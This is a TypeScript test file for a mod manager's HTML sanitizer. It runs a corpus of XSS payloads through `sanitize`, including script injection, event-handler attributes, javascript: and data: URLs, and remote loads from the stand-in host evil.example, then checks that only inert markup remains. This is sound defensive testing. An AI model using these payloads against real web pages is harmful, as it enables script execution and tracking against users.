// SPDX-License-Identifier: MIT OR Apache-2.0
// The XSS corpus (docs/security.md, T3) through the webview's half of the description
// renderer. Rust has already rewritten addresses (html.rs, with its own tests); this checks
// that whatever reaches `sanitize`, hostile or not, comes out as inert markup: only allowed
// tags and attributes, images only as gmmimg keys, links only as link keys.

import { describe, expect, it } from "vitest";
import { sanitize } from "./RichText";

const KEY = "0123456789abcdef".repeat(4);
const IMG = `http://gmmimg.localhost/${KEY}`;
const LINK = "#gmm-link:0123456789abcdef0123456789abcdef";

const ALLOWED_TAGS = new Set(
  (
    "p br hr b strong i em u s strike del sub sup small h1 h2 h3 h4 h5 h6 ul ol li blockquote " +
    "code pre span div a img table thead tbody tr th td"
  ).split(" "),
);
const ALLOWED_ATTRS = new Set([
  "href",
  "src",
  "alt",
  "title",
  "width",
  "height",
  "colspan",
  "rowspan",
  "loading",
  "decoding",
]);

/** Hostile inputs, from the usual XSS cheat sheets plus GameBanana-shaped variations. */
const CORPUS = [
  "<script>alert(1)</script>",
  "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
  '<img src=x onerror="alert(1)">',
  `<img src="${IMG}" onload="alert(1)">`,
  "<img src=javascript:alert(1)>",
  '<img src="https://evil.example/track.png">',
  '<img srcset="https://evil.example/a.png 1x">',
  `<img src="${IMG}/../../etc">`,
  '<img src="gmmimg://localhost/not-a-key">',
  '<a href="javascript:alert(1)">x</a>',
  '<a href="JaVaScRiPt:alert(1)">x</a>',
  '<a href="&#106;avascript:alert(1)">x</a>',
  '<a href="https://evil.example">x</a>',
  '<a href="#gmm-link:../../evil">x</a>',
  `<a href="${LINK}" onclick="alert(1)" target="_blank">x</a>`,
  '<svg onload="alert(1)"><circle r="5"/></svg>',
  "<svg><script>alert(1)</script></svg>",
  '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
  '<iframe src="https://evil.example"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<object data="https://evil.example/x.swf"></object>',
  '<embed src="https://evil.example/x.swf">',
  '<form action="https://evil.example"><input name="q"><button>go</button></form>',
  '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  '<base href="https://evil.example/">',
  '<link rel="stylesheet" href="https://evil.example/x.css">',
  "<style>body{background:url(https://evil.example/x)}</style>",
  '<div style="background:url(https://evil.example/x)">x</div>',
  '<p style="position:fixed;inset:0">overlay</p>',
  '<div class="modal" id="root" data-x="1" aria-hidden="true">x</div>',
  '<table background="https://evil.example/x.png"><tr><td>x</td></tr></table>',
  '<video src="https://evil.example/x.mp4" autoplay></video>',
  '<audio src="https://evil.example/x.mp3" autoplay></audio>',
  '<details open ontoggle="alert(1)"><summary>x</summary></details>',
  '<body onload="alert(1)">',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
  "<!--<img src=x onerror=alert(1)>-->",
  '<img """><script>alert(1)</script>">',
  "<scr<script>ipt>alert(1)</scr</script>ipt>",
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">',
  "<template><script>alert(1)</script></template>",
  '<input autofocus onfocus="alert(1)">',
  '<marquee onstart="alert(1)">x</marquee>',
  '<x onclick="alert(1)">custom element</x>',
  '<p><a href="//evil.example">protocol-relative</a></p>',
];

function assertInert(html: string): void {
  const doc = new DOMParser().parseFromString(`<body>${html}</body>`, "text/html");
  for (const el of doc.body.querySelectorAll("*")) {
    const tag = el.tagName.toLowerCase();
    expect(ALLOWED_TAGS.has(tag), `tag <${tag}> in ${html}`).toBe(true);
    for (const attr of el.getAttributeNames()) {
      expect(ALLOWED_ATTRS.has(attr), `attribute ${attr} on <${tag}> in ${html}`).toBe(true);
    }
    if (tag === "img") expect(el.getAttribute("src")).toBe(IMG);
    if (tag === "a" && el.hasAttribute("href")) expect(el.getAttribute("href")).toBe(LINK);
  }
  expect(html).not.toMatch(/javascript:|data:|evil\.example|<script|\son\w+=/i);
}

describe("sanitize (XSS corpus, T3)", () => {
  it.each(CORPUS)("leaves nothing active in %s", (input) => {
    assertInert(sanitize(input));
  });

  it("keeps GameBanana's ordinary formatting, rewritten images and links", () => {
    const html = `<h2>Install</h2><p>Put it in <b>Mods</b>. <i>Enjoy</i></p><ul><li>one</li></ul><img src="${IMG}" alt="shot" width="640"><a href="${LINK}">credits</a><table><tbody><tr><td colspan="2">cell</td></tr></tbody></table>`;
    const out = sanitize(html);
    assertInert(out);
    expect(out).toContain("<h2>Install</h2>");
    expect(out).toContain("<b>Mods</b>");
    expect(out).toContain(`src="${IMG}"`);
    expect(out).toContain('loading="lazy"');
    expect(out).toContain(`href="${LINK}"`);
    expect(out).toContain('colspan="2"');
    expect(out).toContain('width="640"');
  });

  it("drops an image that isn't a gmmimg key rather than leaving an empty tag", () => {
    expect(sanitize('<p>a<img src="https://images.gamebanana.com/x.jpg">b</p>')).toBe("<p>ab</p>");
  });

  it("treats size attributes as plain values, never as addresses", () => {
    const out = sanitize(
      '<table><tbody><tr><td colspan="javascript:alert(1)" onclick="x()">x</td></tr></tbody></table>',
    );
    expect(out).toBe('<table><tbody><tr><td colspan="javascript:alert(1)">x</td></tr></tbody></table>');
  });

  it("keeps a link's text when its address is refused", () => {
    expect(sanitize('<a href="https://evil.example">read me</a>')).toBe("<a>read me</a>");
  });
});
